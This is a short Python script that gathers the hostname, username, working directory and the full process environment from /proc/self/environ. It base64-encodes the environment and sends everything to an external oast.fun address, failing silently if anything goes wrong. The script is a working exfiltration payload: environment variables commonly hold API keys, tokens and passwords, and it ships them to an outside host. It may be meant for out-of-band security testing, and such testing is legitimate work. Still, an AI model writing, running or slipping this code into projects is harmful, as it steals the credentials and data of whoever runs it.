import requests
import os
import socket
import base64

# Collect system information
hostname = socket.gethostname() or "unknown"
username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown')
cwd = os.getcwd()

# Read environment variables (null-separated) and encode
try:
    with open('/proc/self/environ', 'rb') as f:
        environ_data = f.read().replace(b'\x00', b'\n').decode('utf-8', 'ignore')
except Exception:
    environ_data = "Error reading /proc/self/environ"

# Base64-encode environment data to handle special characters
environ_b64 = base64.b64encode(environ_data.encode()).decode()

# Prepare payload
payload = {
    'hostname': hostname,
    'user': username,
    'cwd': cwd,
    'environ': environ_b64
}

# Target URL (from your example)
url = "https://tsesyx.vovdismvlwftwnvghtcidyqr0gzqar1qn.oast.fun"

# Send data (GET if URL < 2000 chars, else POST)
try:
    # Build potential GET URL
    get_url = f"{url}?{requests.compat.urlencode(payload)}"
    if len(get_url) <= 2000:
        requests.get(get_url, timeout=5)
    else:
        requests.post(url, data=payload, timeout=5)
except Exception:
    pass  # Fail silently
